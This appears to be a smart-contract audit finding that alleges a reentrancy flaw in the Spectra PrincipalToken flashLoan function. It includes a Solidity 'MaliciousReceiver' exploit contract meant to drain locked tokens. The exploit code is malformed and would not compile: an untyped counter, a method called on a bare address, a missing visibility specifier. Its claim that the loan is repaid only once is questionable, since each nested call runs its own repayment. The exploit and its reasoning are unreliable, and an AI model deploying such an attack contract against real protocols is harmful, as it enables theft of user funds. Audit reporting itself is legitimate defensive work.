# Vulnerability details

## Impact
The main impact is that a malicious user can drain all interest bearing token locked in the principal token contract.

## Proof of Concept

In order to reproduce a malicious user has to deploy a malicious receiver contract

```
pragma solidity ^0.8.19;

contract MaliciousReceiver {
    count = 0

  function onFlashLoan(address,address _token,uint256 _amount,uint256,bytes calldata _dat) returns bytes32 {

    if (count < 10) {
      address principalAddress = msg.sender;
      principalAddress.flashLoan(address(this),_token,_amount,_dat);

      count += 1;
      }
      return keccak256("ERC3156FlashBorrower.onFlashLoan");

  }


}
```

Then the attacker proceeds to call the function [flashLoan](https://github.com/code-423n4/2024-02-spectra/blob/383202d0b84985122fe1ba53cfbbb68f18ba3986/src/tokens/PrincipalToken.sol#L609C14-L609C23) by supplying their malicious contract as the receiver address.

Once this call chain is executed it is clear to see that funds will be moved from the principal token address multiple times due to the line 

```
IERC20(ibt).safeTransfer(address(_receiver), _amount);

``` 

and the reentrancy is triggered on the line

```
if (_receiver.onFlashLoan(msg.sender, _token, _amount, fee, _data) != ON_FLASH_LOAN)
            revert FlashLoanCallbackFailed();
```

However the flash loan will only be re-payed once after above on the line

```
IERC20(ibt).safeTransferFrom(address(_receiver), address(this), _amount + fee);

```

## Tools Used

Manual Review

## Recommended Mitigation Steps

I would recommend that a reentrancy guard be added to the flashloan function.


## Assessed type

Reentrancy

